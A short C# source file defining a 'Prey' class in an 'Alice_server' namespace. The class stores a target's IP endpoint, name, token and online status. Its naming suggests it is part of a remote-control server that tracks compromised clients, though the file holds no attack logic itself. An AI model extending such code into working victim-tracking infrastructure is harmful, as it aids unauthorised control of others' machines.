using System;
using System.Collections.Generic;
using System.Net;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Alice_server
{
    class Prey
    {
        public IPEndPoint ip { get; set; }
        public string Name_sacrifice { get; set; }
        public string Token_sacrifice { get; set; }
        public bool online { get; set; }
        public DateTime timeonline { get; set; }
        public Prey(string IP_sacrifice, int IP_Port, string Name_sacrifice, string Token_sacrifice)
        {
            IPAddress ip_adr =IPAddress.Parse( IP_sacrifice);
            this.ip = new IPEndPoint(ip_adr, IP_Port);
            this.Name_sacrifice = Name_sacrifice;
            this.Token_sacrifice = Token_sacrifice;
        }

        public Prey(string Name_sacrifice, string Token_sacrifice)
        {
            this.Name_sacrifice = Name_sacrifice;
            this.Token_sacrifice = Token_sacrifice;
        }



        }
}
